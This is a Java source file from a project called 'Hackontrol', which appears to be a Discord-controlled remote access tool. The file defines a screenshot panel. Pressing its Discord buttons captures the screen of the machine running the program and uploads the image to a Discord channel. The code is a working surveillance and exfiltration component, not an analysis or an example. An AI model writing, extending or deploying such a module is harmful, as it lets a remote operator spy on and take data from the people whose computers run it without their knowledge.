package com.khopan.hackontrol.panel;

import java.util.Calendar;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.nativelibrary.User;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
import com.khopan.hackontrol.widget.ControlWidget;

import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;

public class ScreenshotPanel extends Panel {
	private static final String PANEL_NAME = "screenshot";

	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Screenshot", "screenshot");
	private static final Button BUTTON_REFRESH    = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",    "screenshotRefresh");

	@Override
	public String panelName() {
		return ScreenshotPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, ScreenshotPanel.BUTTON_SCREENSHOT, this :: screenshot);
		this.register(Registration.BUTTON, ScreenshotPanel.BUTTON_REFRESH,    context -> {
			this.screenshot(context);
			HackontrolMessage.delete(context);
		});
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(ScreenshotPanel.BUTTON_SCREENSHOT)
				.build()
		};
	}

	private void screenshot(ButtonContext context) {
		TimeSafeReplyHandler.start(context, consumer -> {
			try {
				MessageCreateBuilder builder = new MessageCreateBuilder();
				builder.setFiles(FileUpload.fromData(User.screenshot(), ScreenshotPanel.getFileName("screenshot")));
				builder.addActionRow(ScreenshotPanel.BUTTON_SCREENSHOT, ScreenshotPanel.BUTTON_REFRESH, HackontrolButton.delete());
				consumer.accept(builder.build());
			} catch(Throwable Errors) {
				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
			}
		});
	}

	private static String getFileName(String baseName) {
		try {
			Calendar calendar = Calendar.getInstance();
			return String.format("%s-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png", baseName, calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH) + 1, calendar.get(Calendar.DAY_OF_MONTH), calendar.get(Calendar.HOUR_OF_DAY), calendar.get(Calendar.MINUTE), calendar.get(Calendar.SECOND), calendar.get(Calendar.MILLISECOND));
		} catch(Throwable Errors) {
			return baseName + ".png";
		}
	}
}
